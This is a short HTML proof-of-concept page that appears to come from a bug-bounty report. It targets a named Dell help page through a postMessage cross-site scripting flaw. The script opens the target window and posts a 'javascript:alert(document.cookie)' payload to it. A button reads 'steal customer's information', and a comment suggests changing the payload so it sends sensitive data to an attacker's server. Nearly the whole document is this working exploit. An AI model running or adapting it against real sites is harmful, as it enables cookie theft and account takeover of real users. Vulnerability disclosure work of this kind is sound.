
<!DOCTYPE html>
<html>
<head>
<title>Get the sensitive information by postmessage</title>
<meta name="referrer" content="never">
</head>
<body>
<button id="openH1">Click Here for start</button>
<button id="stealaccount">steal customer's information</button>
<script>
var h1Win;
var s;
function openWin(){
	h1Win = window.open("https://password.gtie.dell.com/PMUser/HelpFiles/en-US/Content/UserGuide/UG_Assigning_Temporary_Pass.htm?SearchType=Stem&Highlight=password");
	}

	function sendMessage(){
		//var data = JSON.stringify({"type":"link_reload","url":"javasscjavascriptriptcript:alert(document.cookie)"});
		//you can change the url payload for send back some sensitive information to the attacker's server
		h1Win.postMessage("request%%%%%navigate%%%%%javascript:alert(document.cookie)^^^^^test^^^^^800^^^^^400","*");
		console.log("postmessage reload a new iframe's height and width")
	}

 
    // 接受server返回数据
    window.addEventListener('message', function(e) {
        console.log('Get data from oneplus ---> ' + e);
	//clearInterval(s);
    }, false);
document.getElementById("stealaccount").addEventListener('click', sendMessage);
openWin();
setTimeout(sendMessage(),50000);
</script>
</body>
</html>
